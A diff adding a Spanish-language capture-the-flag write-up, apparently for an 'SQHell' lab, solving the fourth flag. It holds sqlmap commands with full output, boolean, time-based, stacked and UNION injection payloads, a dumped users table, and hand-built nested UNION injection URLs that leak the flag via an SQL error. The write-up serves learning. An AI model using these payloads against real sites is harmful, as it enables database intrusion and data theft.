@@ -799,3 +799,264 @@ Table: flag
 
 [*] ending @ 13:28:03 /2026-08-13/
 
+Y tan solo me falta la cuarta.
+
+Por descarte intuyo que es en la pagina user/, ya que /post, /register, /login y /terms-and-conditions estan hechas.
+
+Voy a /user.
+
+Falta el parámetro id.
+
+ sqlmap -u "http://10.129.173.246/user?id=1" \
+  --dbms mysql \
+  --level=5 --risk=3 \
+  --batch --dbs
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.8.4#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 13:31:39 /2026-08-13/
+
+[13:31:39] [INFO] testing connection to the target URL
+[13:31:39] [INFO] checking if the target is protected by some kind of WAF/IPS
+[13:31:39] [INFO] testing if the target URL content is stable
+[13:31:39] [INFO] target URL content is stable
+[13:31:39] [INFO] testing if GET parameter 'id' is dynamic
+[13:31:40] [INFO] GET parameter 'id' appears to be dynamic
+[13:31:40] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
+[13:31:40] [INFO] testing for SQL injection on GET parameter 'id'
+[13:31:40] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[13:31:40] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="User")
+[13:31:40] [INFO] testing 'Generic inline queries'
+[13:31:40] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[13:31:40] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[13:31:40] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[13:31:40] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[13:31:40] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[13:31:40] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[13:31:41] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[13:31:41] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[13:31:41] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[13:31:41] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[13:31:41] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[13:31:41] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[13:31:41] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[13:31:41] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[13:31:41] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[13:31:41] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
+[13:31:41] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
+[13:31:41] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[13:31:41] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
+[13:31:41] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
+[13:31:41] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
+[13:31:41] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
+[13:31:41] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[13:31:41] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
+[13:31:41] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
+[13:31:42] [INFO] testing 'MySQL inline queries'
+[13:31:42] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[13:31:52] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 stacked queries (comment)' injectable 
+[13:31:52] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[13:32:02] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+[13:32:02] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[13:32:02] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[13:32:02] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[13:32:02] [INFO] target URL appears to have 3 columns in query
+[13:32:03] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 59 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 7357=7357
+
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: id=1;SELECT SLEEP(5)#
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 7024 FROM (SELECT(SLEEP(5)))oqva)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: id=-5804 UNION ALL SELECT NULL,CONCAT(0x716a627871,0x46586d79436749715967594e68656a6e6e716c74506a78664f4d56596a4d71726363654453615675,0x717a6b7071),NULL-- -
+---
+[13:32:03] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL >= 5.0.12
+[13:32:03] [INFO] fetching database names
+available databases [2]:
+[*] information_schema
+[*] sqhell_4
+
+[13:32:03] [INFO] fetched data logged to text files under '/home/mksk/.local/share/sqlmap/output/10.129.173.246'
+[13:32:03] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 13:32:03 /2026-08-13/
+
+Bueno, ya estaria, tan solo queda sacar la flag.
+
+ sqlmap -u "http://10.129.173.246/user?id=1" \
+  --dbms mysql \
+  --level=5 --risk=3 \
+  --batch -D sqhell_4 --tables
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.8.4#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 13:32:49 /2026-08-13/
+
+[13:32:49] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 7357=7357
+
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: id=1;SELECT SLEEP(5)#
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 7024 FROM (SELECT(SLEEP(5)))oqva)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: id=-5804 UNION ALL SELECT NULL,CONCAT(0x716a627871,0x46586d79436749715967594e68656a6e6e716c74506a78664f4d56596a4d71726363654453615675,0x717a6b7071),NULL-- -
+---
+[13:32:50] [INFO] testing MySQL
+[13:32:50] [INFO] confirming MySQL
+[13:32:50] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL >= 8.0.0
+[13:32:50] [INFO] fetching tables for database: 'sqhell_4'
+Database: sqhell_4
+[1 table]
++-------+
+| users |
++-------+
+
+[13:32:50] [INFO] fetched data logged to text files under '/home/mksk/.local/share/sqlmap/output/10.129.173.246'
+[13:32:50] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 13:32:50 /2026-08-13/
+
+ sqlmap -u "http://10.129.173.246/user?id=1" \
+  --dbms mysql \
+  --level=5 --risk=3 \
+  --batch -D sqhell_4 -T users --dump
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.8.4#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 13:36:01 /2026-08-13/
+
+[13:36:01] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 7357=7357
+
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: id=1;SELECT SLEEP(5)#
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 7024 FROM (SELECT(SLEEP(5)))oqva)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: id=-5804 UNION ALL SELECT NULL,CONCAT(0x716a627871,0x46586d79436749715967594e68656a6e6e716c74506a78664f4d56596a4d71726363654453615675,0x717a6b7071),NULL-- -
+---
+[13:36:01] [INFO] testing MySQL
+[13:36:01] [INFO] confirming MySQL
+[13:36:01] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL >= 8.0.0
+[13:36:01] [INFO] fetching columns for table 'users' in database 'sqhell_4'
+[13:36:01] [INFO] fetching entries for table 'users' in database 'sqhell_4'
+Database: sqhell_4
+Table: users
+[1 entry]
++----+----------+----------+
+| id | password | username |
++----+----------+----------+
+| 1  | password | admin    |
++----+----------+----------+
+
+[13:36:01] [INFO] table 'sqhell_4.users' dumped to CSV file '/home/mksk/.local/share/sqlmap/output/10.129.173.246/dump/sqhell_4/users.csv'
+[13:36:01] [INFO] fetched data logged to text files under '/home/mksk/.local/share/sqlmap/output/10.129.173.246'
+[13:36:01] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 13:36:01 /2026-08-13/
+
+Consigo unas credenciales.
+No puedo hacer login con esas credenciales.
+
+Y con sqlmap, puedo ver la tabla, dumpearla, pero no hay nada relevante dentro.
+
+Pruebo manualmente.
+
+http://10.129.173.246/user?id=1 esto me muestra los posts de admin.
+
+Copio la payload de la primera flag que he conseguido y la modifico un poco.
+
+http://10.129.173.246/user?id=1%20UNION%20SELECT%201,2,3%20FROM%20users
+
+Al quitarle la cuarta columna me da resultado.
+
+http://10.129.173.246/user?id=2%20UNION%20SELECT%201,2,3%20FROM%20users 
+Si modifico el id a 2, me lo muestra aunque el usuario no exista.
+
+Me voy a la pista. Well, dreams, they feel real while we're in them right?
+No me dice nada. Es una frase de una película.
+
+Tras probar unas cuantas payloads, pruebo inyeccion anidada.
+
+Y en el user id sale la payload.
+User ID:  1 union select 1,flag,3 from flag
+Sigo probando.
+
+http://10.129.173.246/user?id=2%20union%20select%20%221%20union%20select%20flag,2,3,4%20from%20flag%22,1,2%20from%20users
+
+Llego a esta payload, y aparece un post más. 2.
+
+User ID:  1 union select flag,2,3,4 from flag
+Username:  1
+Posts:
+
+    First Post
+    Second Post
+    2
+
+Al clicar me lleva a una página con un error.
+
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '{FLAG4:***************************}' at line 1
+
+Bueno, pues ya tendría la cuarta flag.
+
